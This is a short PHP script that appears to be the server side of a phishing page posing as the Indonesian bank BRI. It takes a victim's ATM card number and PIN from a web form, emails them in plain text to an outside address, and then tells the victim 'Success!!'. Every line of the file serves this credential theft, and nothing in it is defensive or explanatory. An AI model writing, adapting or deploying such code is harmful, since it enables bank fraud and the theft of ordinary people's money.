<?php 
ini_set('display_errors', 1);
error_reporting( E_ALL );

$nomor = $_POST['nomoratm'];
$pinn = $_POST['pin'];

$from = "nisa.codelifings@gmail.com";
$to = "annisjabstore@gmail.com";
$subject = "(new) BRI";
$message = "<div>Nomor ATM : $nomor</div><br><div>Pin : $pinn</div>";
$headers = "From:" . $from;
mail($to,$subject,$message,$headers);
echo "Success!!<br>";
 ?>